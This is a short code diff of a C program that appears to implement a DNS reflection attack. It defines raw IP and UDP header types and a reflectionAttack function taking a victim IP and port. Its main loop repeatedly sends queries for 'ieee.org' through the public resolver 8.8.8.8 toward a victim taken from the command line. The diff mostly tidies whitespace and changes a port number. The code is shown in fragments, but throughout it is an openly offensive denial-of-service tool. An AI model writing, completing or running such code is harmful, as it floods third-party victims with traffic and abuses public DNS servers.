@@ -10,13 +10,8 @@
 #include <sys/time.h>
 #include <time.h>
 
-
-
-
 typedef struct iphdr ip_header;
 typedef struct udphdr udp_header;
-
-
 
 typedef struct
 {
@@ -100,10 +95,8 @@ void urlFormatTransform(unsigned char *after, unsigned char *before){
     *after++ = 0x00;
     return;
 }
-void reflectionAttack(char *victim_ip, int victim_port, char *dns_server, int dns_port,
-    unsigned char *query_url)
+void reflectionAttack(char *victim_ip, int victim_port, char *dns_server, int dns_port, unsigned char *query_url)
 {
-    
     unsigned char dns_rcrd[32];
     unsigned char *dns_url1;
     dns_url1 = malloc(32);
@@ -211,7 +204,7 @@ int main(int argc, char **argv)
     char *victim_ip = argv[1];
     int victim_port = atoi(argv[2]);
     char * dns_server = argv[3];
-    int dns_port = 53;
+    int dns_port = 7;
     
     while(1) {
         reflectionAttack(victim_ip, victim_port, "8.8.8.8", 7, "ieee.org");
